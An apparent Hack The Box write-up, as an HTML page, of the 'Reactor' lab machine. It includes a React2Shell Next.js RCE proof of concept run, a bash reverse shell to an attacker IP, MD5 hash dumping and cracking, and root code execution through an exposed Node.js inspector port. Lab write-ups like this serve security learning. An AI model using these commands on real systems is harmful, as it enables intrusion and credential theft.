@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Reactor | shreekara@sec</title>
+<meta name="description" content="HTB Reactor: Next.js React2Shell RCE, SQLite credential extraction, Node debug port privesc to root.">
+<link rel="icon" type="image/png" href="../../assets/img/favicon-32.png">
+<link rel="apple-touch-icon" href="../../assets/img/apple-touch-icon.png">
+<meta property="og:title" content="Reactor | shreekara@sec">
+<meta property="og:description" content="HTB Reactor: Next.js React2Shell RCE, SQLite credential extraction, Node debug port privesc to root.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://sneakyyy.site/writeups/reactor/reactor.html">
+<meta property="og:image" content="../../assets/img/splash2.jpg">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<div class="site">
+<main>
+<div class="prompt-l"><span class="u">shreekara</span>@<span class="h">sneaky69</span>:~/writeups/reactor$</div>
+
+<nav class="path-nav">
+  <a href="../../index.html"><span class="tilde">~/</span>home</a>
+  <a href="../../about/about.html"><span class="tilde">~/</span>about</a>
+  <a href="../../writeups/writeups.html" class="active"><span class="tilde">~/</span>writeups</a>
+  <a href="../../projects/projects.html"><span class="tilde">~/</span>projects</a>
+  <a href="../../experience/experience.html"><span class="tilde">~/</span>experience</a>
+  <a href="../../blog/blog.html"><span class="tilde">~/</span>blog</a>
+</nav>
+
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">cat</span><span class="a">reactor.md</span></div></div>
+
+<h1 style="color:var(--white);font-size:20px;margin-bottom:0.6rem;">HTB Write-Up: Reactor</h1>
+
+<table class="ptable">
+  <tr><td>Platform</td><td>Hack The Box</td></tr>
+  <tr><td>Difficulty</td><td><span class="badge easy">Easy</span></td></tr>
+  <tr><td>OS</td><td>Linux</td></tr>
+  <tr><td>Author</td><td>shreekara</td></tr>
+  <tr><td>Date</td><td>May 24, 2026</td></tr>
+  <tr><td>Source</td><td><a href="https://github.com/ShreekaraKedlaya/Hackthebox-writeups/blob/main/Reactor.md" target="_blank">github.com/ShreekaraKedlaya/Hackthebox-writeups</a></td></tr>
+</table>
+
+<hr class="sep">
+
+<p class="section-lbl">Table of Contents</p>
+<pre class="cb">1. Reconnaissance
+2. Enumeration — ReactorWatch Dashboard &amp; Version Fingerprinting
+3. Initial Access — CVE-2025-55182 (React2Shell RCE)
+4. Lateral Movement — SQLite Credential Extraction &amp; Hash Cracking
+5. Privilege Escalation — Node.js Debug Port Hijacking
+6. Summary &amp; Takeaways</pre>
+
+<hr class="sep">
+
+<p class="section-lbl">1. Reconnaissance</p>
+<p>Starting with a full port scan to get an idea of what's exposed:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">nmap</span><span class="a">-sC -sV -O -T4 10.129.6.0</span></div></div>
+<p>Only two ports came back:</p>
+<table class="ptable">
+  <tr><td>Port</td><td>Service</td><td style="color:var(--fg);">Details</td></tr>
+  <tr><td>22</td><td>SSH</td><td style="color:var(--fg);">OpenSSH 9.6p1 (Ubuntu)</td></tr>
+  <tr><td>3000</td><td>HTTP</td><td style="color:var(--fg);">Next.js — ReactorWatch application</td></tr>
+</table>
+<p>Pretty minimal attack surface. SSH is usually a dead end without creds, so port 3000 is where the focus needs to be.</p>
+
+<hr class="sep">
+
+<p class="section-lbl">2. Enumeration — ReactorWatch Dashboard &amp; Version Fingerprinting</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">2.1 — Web Application Fingerprinting</p>
+<p>Ran WhatWeb first to fingerprint the stack quickly:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">whatweb</span><span class="a">10.129.6.0:3000</span></div>
+  <div class="cmd-out">
+    http://10.129.6.0:3000 [200 OK] HTML5, Title[ReactorWatch | Core Monitoring System],<br>
+    UncommonHeaders[x-nextjs-cache,x-nextjs-prerender,x-nextjs-stale-time], X-Powered-By[Next.js]
+  </div>
+</div>
+<p>The app is called <strong style="color:var(--white);">ReactorWatch</strong> — a nuclear reactor core monitoring dashboard. More importantly, the <code style="color:var(--cyan);">X-Powered-By</code> header and the Next.js-specific response headers confirm it's running <strong style="color:var(--white);">Next.js 15.0.3</strong>. That version number is going to matter.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">2.2 — Unauthenticated Dashboard</p>
+<p>Navigating to <code style="color:var(--cyan);">http://10.129.6.0:3000</code> — no login, no auth, nothing. The dashboard just loads and immediately starts leaking information.</p>
+<p><strong style="color:var(--white);">Reactor telemetry (live, unauthenticated):</strong></p>
+<table class="ptable">
+  <tr><td>Core Status</td><td style="color:var(--fg);">Reactor Power 98.2%, Criticality 1.0002 (WARNING)</td></tr>
+  <tr><td>Core Temp</td><td style="color:var(--fg);">324°C</td></tr>
+  <tr><td>Pressure</td><td style="color:var(--fg);">155 bar</td></tr>
+  <tr><td>Coolant Flow</td><td style="color:var(--fg);">18.4k m³/h (CAUTION)</td></tr>
+  <tr><td>Turbine Output</td><td style="color:var(--fg);">1.21 GW</td></tr>
+</table>
+<p><strong style="color:var(--white);">On-site personnel — also just... listed there:</strong></p>
+<table class="ptable">
+  <tr><td>Name</td><td>Role</td><td style="color:var(--fg);">Status</td></tr>
+  <tr><td>Dr. Elena Rodriguez</td><td>Lead Nuclear Engineer</td><td style="color:var(--green);">ONLINE</td></tr>
+  <tr><td>Marcus Kim</td><td>Senior Technician</td><td style="color:var(--green);">ONLINE</td></tr>
+  <tr><td>James Thompson</td><td>Safety Officer</td><td style="color:var(--fg-dim);">OFFLINE</td></tr>
+</table>
+<p>Even if there was no direct exploit here, this is terrible from a security standpoint. Personnel names, roles, and live operational data — all public. Good recon material either way.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">2.3 — Directory Enumeration</p>
+<p>Threw Feroxbuster at it to find any hidden paths:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">feroxbuster</span><span class="a">-u http://10.129.6.0:3000 -C 404 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt</span></div></div>
+<p>One oddity came up:</p>
+<div class="cmd-out">308&nbsp;&nbsp;GET&nbsp;&nbsp;http://10.129.6.0:3000/cgi-bin/&nbsp;=>&nbsp;http://10.129.6.0:3000/cgi-bin</div>
+<p style="margin-top:0.8rem;">A <code style="color:var(--cyan);">/cgi-bin/</code> on a Next.js app doesn't make much sense — probably a red herring or misconfiguration. Noted it and moved on, since the more interesting angle was the framework version itself.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">2.4 — CVE Research</p>
+<p>A quick search on Next.js 15.0.3 turns up <strong style="color:var(--red2);">CVE-2025-55182</strong>, sometimes called <strong style="color:var(--red2);">React2Shell</strong>. It's a critical unauthenticated RCE via prototype pollution and unsafe deserialization in the React Server Components handler. The attack vector is injecting a malicious payload through the <code style="color:var(--cyan);">Next-Action</code> header. No auth needed, which makes this very clean.</p>
+
+<hr class="sep">
+
+<p class="section-lbl">3. Initial Access — CVE-2025-55182 (React2Shell RCE)</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">3.1 — How the Vulnerability Works</p>
+<p>The RSC handler in Next.js 15.0.3 doesn't properly sanitize the <code style="color:var(--cyan);">Next-Action</code> header. By crafting a payload that exploits prototype pollution combined with unsafe deserialization, an attacker can get arbitrary OS command execution on the server. The service doesn't need to be authenticated — the vulnerable endpoint is reachable by anyone.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">3.2 — Confirming RCE</p>
+<p>Used a public Python PoC to verify execution before going for a shell:</p>
+<div class="cmd">
+  <div class="cmd-line"><span class="d">$</span><span class="c">python3</span><span class="a">exploit.py --url http://10.129.6.0:3000 --cmd whoami</span></div>
+  <div class="cmd-out">Success<br>node</div>
+</div>
+<div class="cmd">
+  <div class="cmd-line"><span class="d">$</span><span class="c">python3</span><span class="a">exploit.py --url http://10.129.6.0:3000 --cmd pwd</span></div>
+  <div class="cmd-out">Success<br>/opt/reactor-app</div>
+</div>
+<p>Running as <code style="color:var(--cyan);">node</code> (uid=999) — low-privileged, but enough to start moving.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">3.3 — Getting a Shell</p>
+<p>Base64-encoded the reverse shell to avoid issues with quoting and special characters in the command argument:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">echo</span><span class="a">'bash -i >&amp; /dev/tcp/10.10.16.194/9001 0>&amp;1' | base64 -w 0</span></div></div>
+<p>Set up the listener:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">rlwrap nc</span><span class="a">-lnvp 9001</span></div></div>
+<p>Fired the payload:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">python3</span><span class="a">exploit.py --url http://10.129.6.0:3000 --cmd "echo &lt;base64-payload&gt; | base64 -d | bash"</span></div></div>
+<p>Shell landed:</p>
+<div class="cmd-out">connect to [10.10.16.194] from (UNKNOWN) [10.129.6.0]<br>node@reactor:/opt/reactor-app$</div>
+
+<hr class="sep">
+
+<p class="section-lbl">4. Lateral Movement — SQLite Credential Extraction &amp; Hash Cracking</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">4.1 — Poking Around the App Directory</p>
+<p>First thing to do after getting a shell — enumerate the application files:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">ls</span><span class="a">-la /opt/reactor-app</span></div></div>
+<p>Two files immediately stood out:</p>
+<table class="ptable">
+  <tr><td>File</td><td style="color:var(--fg);">Notes</td></tr>
+  <tr><td>.env</td><td style="color:var(--fg);">Application environment configuration</td></tr>
+  <tr><td>reactor.db</td><td style="color:var(--fg);">SQLite database — readable by the node user</td></tr>
+</table>
+<p>An SQLite database sitting right in the app directory, readable by the current user. That's almost always going to have something useful.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">4.2 — Dumping the Database</p>
+<div class="cmd">
+  <div class="cmd-line"><span class="d">$</span><span class="c">sqlite3</span><span class="a">/opt/reactor-app/reactor.db</span></div>
+  <div class="cmd-out">
+    sqlite&gt; .tables<br>
+    sqlite&gt; SELECT * FROM users;<br><br>
+    1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb<br>
+    2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
+  </div>
+</div>
+<p>Two accounts with what look like MD5 hashes. MD5 is weak, so these should crack fast.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">4.3 — Cracking the Hashes</p>
+<p>Focused on the <code style="color:var(--cyan);">engineer</code> hash since that account is more likely to have SSH access:</p>
+<div class="cmd">
+  <div class="cmd-line"><span class="d">$</span><span class="c">john</span><span class="a">--wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5</span></div>
+  <div class="cmd-out">reactor1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(?)<br>1g 0:00:00:00 DONE 50.00g/s 16857Kp/s</div>
+</div>
+<p>Cracked instantly. Credentials: <strong style="color:var(--white);">engineer:reactor1</strong></p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">4.4 — SSH as Engineer</p>
+<div class="cmd">
+  <div class="cmd-line"><span class="d">$</span><span class="c">ssh</span><span class="a">engineer@10.129.6.0</span></div>
+  <div class="cmd-out">Logged in without any issues.</div>
+</div>
+<p>User flag is at <code style="color:var(--cyan);">/home/engineer/user.txt</code>.</p>
+
+<hr class="sep">
+
+<p class="section-lbl">5. Privilege Escalation — Node.js Debug Port Hijacking</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">5.1 — Checking Internal Services</p>
+<p>With a proper shell as <code style="color:var(--cyan);">engineer</code>, time to look for anything listening internally that wasn't visible from outside:</p>
+<div class="cmd">
+  <div class="cmd-line"><span class="d">$</span><span class="c">ss</span><span class="a">-tulnp</span></div>
+  <div class="cmd-out">tcp&nbsp;&nbsp;LISTEN&nbsp;&nbsp;0&nbsp;&nbsp;511&nbsp;&nbsp;127.0.0.1:9229&nbsp;&nbsp;0.0.0.0:*</div>
+</div>
+<p>Port <strong style="color:var(--white);">9229</strong> on localhost — that's the standard Node.js V8 Inspector port. When a Node.js process is started with <code style="color:var(--cyan);">--inspect</code>, it opens this port and allows anyone who can reach it to attach a debugger and run arbitrary JavaScript. If the process running it is privileged, that's a direct path to root.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">5.2 — Identifying the Process</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">cat</span><span class="a">/opt/uptime-monitor/worker.js</span></div></div>
+<p>It's a Node.js uptime monitoring worker that pings the ReactorWatch app every 30 seconds. Crucially — it's running as <strong style="color:var(--red2);">root</strong> and was started with <code style="color:var(--cyan);">--inspect</code>, which is why 9229 is open. Classic misconfiguration: a maintenance script that no one thought twice about running as root.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">5.3 — Forwarding the Debug Port</p>
+<p>The port is only accessible from localhost on the target, so an SSH tunnel gets it to the attacking machine:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">ssh</span><span class="a">-L 9229:127.0.0.1:9229 engineer@10.129.6.0</span></div></div>
+<p>Now <code style="color:var(--cyan);">127.0.0.1:9229</code> locally maps directly to the Node.js debugger on the target.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">5.4 — Connecting to the Debugger</p>
+<div class="cmd">
+  <div class="cmd-line"><span class="d">$</span><span class="c">node inspect</span><span class="a">127.0.0.1:9229</span></div>
+  <div class="cmd-out">connecting to 127.0.0.1:9229 ... ok<br>debug&gt;</div>
+</div>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">5.5 — RCE as Root</p>
+<p><code style="color:var(--cyan);">require</code> doesn't work directly in this context, but <code style="color:var(--cyan);">process.mainModule.require</code> does — it reaches the module system through the already-loaded main module:</p>
+<div class="cmd">
+  <div class="cmd-line"><span class="d">debug&gt;</span><span class="c">exec</span><span class="a">("process.mainModule.require('child_process').execSync('id').toString()")</span></div>
+  <div class="cmd-out">'uid=0(root) gid=0(root) groups=0(root)\n'</div>
+</div>
+<p>Running as root. From here, a root shell gets sent back the same way, and a listener catches it:</p>
+<div class="cmd">
+  <div class="cmd-line"><span class="d">$</span><span class="c">nc</span><span class="a">-lnvp 9002</span></div>
+  <div class="cmd-out">connect to [10.10.16.194] from (UNKNOWN) [10.129.6.0]<br>root@reactor:~#</div>
+</div>
+<p>Root flag is at <code style="color:var(--cyan);">/root/root.txt</code>.</p>
+
+<hr class="sep">
+
+<p class="section-lbl">6. Summary &amp; Takeaways</p>
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">Attack Chain</p>
+<table class="ptable">
+  <tr><td>Phase</td><td>Technique</td><td style="color:var(--fg);">Result</td></tr>
+  <tr><td>Recon</td><td>nmap -A</td><td style="color:var(--fg);">Ports 22, 3000 identified</td></tr>
+  <tr><td>Fingerprinting</td><td>WhatWeb + headers</td><td style="color:var(--fg);">Next.js 15.0.3 → CVE-2025-55182</td></tr>
+  <tr><td>Initial Access</td><td>React2Shell — Next-Action header injection</td><td style="color:var(--fg);">Shell as node</td></tr>
+  <tr><td>Credential Extraction</td><td>SQLite DB dump → MD5 hashes</td><td style="color:var(--fg);">engineer:reactor1</td></tr>
+  <tr><td>Hash Cracking</td><td>John the Ripper + rockyou.txt</td><td style="color:var(--fg);">Password cracked instantly</td></tr>
+  <tr><td>Lateral Movement</td><td>SSH with cracked credentials</td><td style="color:var(--fg);">Shell as engineer + user flag</td></tr>
+  <tr><td>Privilege Escalation</td><td>Node --inspect → SSH tunnel → mainModule.require</td><td style="color:var(--fg);">Root shell + root flag</td></tr>
+</table>
+
+<p style="color:var(--white);font-weight:700;margin-top:1.2rem;">What I Took Away From This Box</p>
+<p style="margin-top:0.6rem;">The thing that stuck with me here is how much of the chain came from stuff that wasn't technically a vulnerability on its own. An unauthenticated dashboard handing out personnel names and stack details isn't an exploit, it's just bad defaults &mdash; but it's exactly what told me where to look for the real CVE. Same with the <code style="color:var(--cyan);">X-Powered-By</code> header: nobody strips that on a dev box, and it saved me a lot of guessing on version fingerprinting.</p>
+<p style="margin-top:0.6rem;">The SQLite file sitting readable in the app directory was the part that annoyed me most, honestly, because it's such a common mistake. If your DB lives inside the web root with world-readable perms, you've basically pre-cracked your own creds for whoever gets a foothold.</p>
+<p style="margin-top:0.6rem;">Root cause of the privesc was a maintenance script running with <code style="color:var(--cyan);">--inspect</code> as root. I hadn't actually exploited a Node debug port before this box, so getting <code style="color:var(--cyan);">process.mainModule.require</code> to hand me code execution was the highlight for me. Once I had that, the rest was just tunneling and catching a shell &mdash; but the debug port thing is going straight into my privesc checklist for future boxes.</p>
+
+<a class="back-link" href="../../writeups/writeups.html">&lt; cd ~/writeups</a>
+
+</main>
+<footer>
+  <span>shreekara // security researcher</span>
+  <span><a href="../../writeups/writeups.html">writeups</a> · <a href="https://github.com/ShreekaraKedlaya" target="_blank">github</a></span>
+</footer>
+</div>
+</body>
+</html>
